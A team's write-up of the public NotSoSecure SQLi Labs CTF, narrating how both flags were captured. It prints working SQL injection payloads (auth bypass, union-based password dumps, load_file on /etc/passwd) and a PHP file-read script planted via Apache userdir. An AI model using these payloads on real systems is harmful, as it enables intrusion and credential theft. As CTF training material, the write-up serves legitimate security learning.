
NotSoSecure CTF Writeup
=======================

This is a writeup for the public CTF hosted by NoSoSecure for the celebration 
of SQLi Labs's launch. It started 16:00 BST on Friday 25th October and ended 
21:00 BST on Sunday 27th October. Three PizzaEaters' members participated.

First flag
-----------
In the mail containing the instructions to start the CTF, the following URL was
supplied:
 
	http://ctf.notsosecure.com/71367217217126217712/

This page requires an username and password, but there was no mention of it in 
the email. We submitted the form empty, and noticed a HTTP 302 redirect with 
the following information:

	7365637265745f72656769737465722e68746d6c

We noticed the hex encoding and we decoded the string with this simple Python 
script:

	s = '7365637265745f72656769737465722e68746d6c'
	print ''.join([chr(int(s[n:n+2], 16)) for n in xrange(0, len(s), 2)])

The output was `secret_register.html`. Opening the page we are greeted with a 
registration form which we filled and noticed that the registration is 
performed through a GET request:

	http://ctf.notsosecure.com/71367217217126217712/register.php?regname=foobar&
	regemail=foo%40bar.com&regpass1=a&regpass2=a

After that, we see a page with a link to a login page, after logging in we are 
redirected to `uber_secret.php`. After the redirect, we noticed the server set 
a HTTP cookie containing an encoded information in the `session_id` field:
 
	Set-Cookie: session_id=Zm9vQGJhci5jb20%3D

It looked like base64 to us, and it was:

	$ echo -n "Zm9vQGJhci5jb20=" | base64 -d
	foo@bar.com

It seems the page sets a cookie containing the user's email. "This thing 
probably has an admin user", we thought, so we started injecting SQL using that 
username. We tried using `username` and then `name` as the column name, the 
latter was correct. So, injecting `!!' or name = 'admin`, we noticed that 
`session_id` was changed to `YWRtaW5Ac3FsaWxhYnMuY29t`, which after decoding 
means `admin@sqlilabs.com`.

Perfect! We just found the flaw. Now we need to figure out the password column
and the table name to retrieve the password from the `admin` user. We assumed 
the column would be called `password` so we now only had to discover the table 
name. We looked up for tables with `password`-named columns with the following 
SQL:

	!!' union select (select table_name from information_schema.columns where column_name = 'password'), 'a

Turns out it was called `users`, how predictable. Why didn't we try `users` 
before typing all that SQL?

Now we only need to know the user's password. Injecting this we got 
`sqlilabRocKs!!` as administrator password:

	!!' union select password, name from users where name = 'admin

Logging in using `admin` and `sqlilabRocKs!!` we see the instruction to the next
flag:

	Well done, Flag is 815290. 2nd flag is in file secret.txt

Second flag
-----------

The first flag revealed that the server had a `/secret.txt file`, which we 
tried to read using `load_file()` in a SQLi only to find that we were unable to 
do so. How foolish of us, of course they wouldn't make it that easy.

After we put some thought on it, a member of our team suggested trying to read 
`/etc/passwd` and we did it by injecting `!!' union select 
load_file('/etc/passwd'), 'a` as the value of the `myusername` field in a POST 
request to `checklogin.php`. Guess what we found? There was an user which had 
his password field set:

	temp123:x:1001:1001:weakpassword1:/home/temp123:/bin/sh

We ssh'd into `ctf.notsosecure.com` using that username and password and it 
worked. Now we only had to read `/secret.txt`:

	cat: /secret.txt: Permission denied

Oh snap! Why can't we read it? `ls -l` revealed it could only be read by 
`www-data`:

	-r--------   1 www-data www-data   684 Oct 25 07:46 secret.txt

We couldn't use `sudo` or `su`, we didn't find any exploitable suid executable 
(we didn't search thoroughly actually) and we could not put a script into 
`/var/www` to dump the file's contents. "damn", we thought, "how the hell are 
we going to read that file?". After looking for more options, we went to apache's
configuration directory and then into it's `mods-enabled`folder and we saw this:

	lrwxrwxrwx 1 root root 30 Oct  6 17:17 userdir.conf -> ../mods-available/userdir.conf
	lrwxrwxrwx 1 root root 30 Oct  6 17:17 userdir.load -> ../mods-available/userdir.load

"Mua-ha-ha!" Now everything seemed clear, and it was. We created 
`~temp12/public_html` and put a little PHP script to dump the file:

	<?php echo file_get_contents('/secret.txt');

We opened the URL `http://ctf.notsosecure.com/~temp123/` and there it was, the
flag. We had finally reached the goal of our quest:

	Well done, 2nd Flag is 128738213812990. email both the flags to ctf@notsosecure.com [...]

What a pleasant journey we had! Thank you to SQLi Labs and NotSoSecure for all 
the fun. See you next time!

